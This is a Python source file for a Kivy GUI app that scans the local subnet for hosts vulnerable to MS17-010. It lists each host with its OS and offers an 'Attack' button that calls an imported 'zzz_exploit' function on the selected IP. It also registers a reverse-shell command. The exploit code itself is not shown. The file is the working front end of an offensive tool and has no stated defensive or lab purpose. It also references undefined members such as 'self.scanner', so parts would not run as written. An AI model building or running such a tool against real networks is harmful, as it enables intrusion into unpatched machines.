from shell_control.shell_control import ShellControl
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from widgets.iplist import IPList
from kivy.logger import Logger
from commands.ms1710_scan_shell_command import MS1710SubnetScannerCommand
from commands.ms1710_reverse_shell_command import MS1710ReverseShellCommand
from ms1710.zzz_exploit import exploit


class ScannerLayout(GridLayout):
    def __init__(self, **kwargs):
        self.shell_control = ShellControl()
        self.scanner_id = self.shell_control.add_shell_flow_command('MS1710Scanner', 'ms1710_scan', MS1710SubnetScannerCommand, False)
        self.revere_shell_id = self.shell_control.add_shell_flow_command('MS1710ReverseShell', 'ms1710_reverse_shell', MS1710ReverseShellCommand, False)

        self.shell_control.add_event_listener(self.scanner_id, 'scan_started', self.on_scan_started_event)
        self.shell_control.add_event_listener(self.scanner_id, 'scan_update', self.on_scan_update_event)
        self.shell_control.add_event_listener(self.scanner_id, 'scan_finished', self.on_scan_finished_event)
        self.ip_list = IPList(size_hint_y=0.7)
        self.scan_button = Button(text="Scan", size_hint_y=0.15)
        self.scan_button.bind(on_press=self.on_scan_button_cb)
        self.attack_button = Button(text='Attack', size_hint_y=0.15)
        self.attack_button.bind(on_press=self.on_attack_button_cb)
        self.attack_button.disabled = True
        kwargs['cols'] = 1
        kwargs['size_hint'] = (1.0, 1.0)

        super(ScannerLayout, self).__init__(**kwargs)

        self.add_widget(self.scan_button)
        self.add_widget(self.attack_button)
        self.add_widget(self.ip_list)

    def on_attack_button_cb(self, instance):
        selected_ip = str(self.ip_list.list_adapter.selection[0].text).split('-')[0].strip()
        Logger.info('Selected IP to attack = ' + selected_ip)
        if exploit(selected_ip):
            Logger.info("Exploit Succ!")
        else:
            Logger.warn("Exploit Failure")

    def on_scan_button_cb(self, instance):
        Logger.fatal("Starting the scanner")
        my_ip = self.__get_ip()
        if not my_ip:
            Logger.fatal('Cannot init scanner, failed to find IP, aborting')
            return
        self.shell_control.execute_shell_flow_commannd(self.scanner_id, {'subnet': my_ip, 'nthreads': 20})
        self.scan_button.disabled = True

    def on_scan_started_event(self, event, event_args):
        Logger.info('Scanner Start CB')

    def on_scan_finished_event(self, event, event_args):
        Logger.info('Scanner Finish CB')
        if len(self.scanner.get_scanned_targets()) > 0:
            self.attack_button.disabled = False
        self.scan_button.disabled = False

    def on_scan_update_event(self, event, event_args):
        Logger.info('Scanner Update CB')
        scanned_ips = event_args['ip_list']
        self.ip_list.set_ips([t['IP'] + ' - ' + t['OS'] for t in scanned_ips])


class ScannerApp(App):
    def build(self):
        layout = ScannerLayout()
        return layout

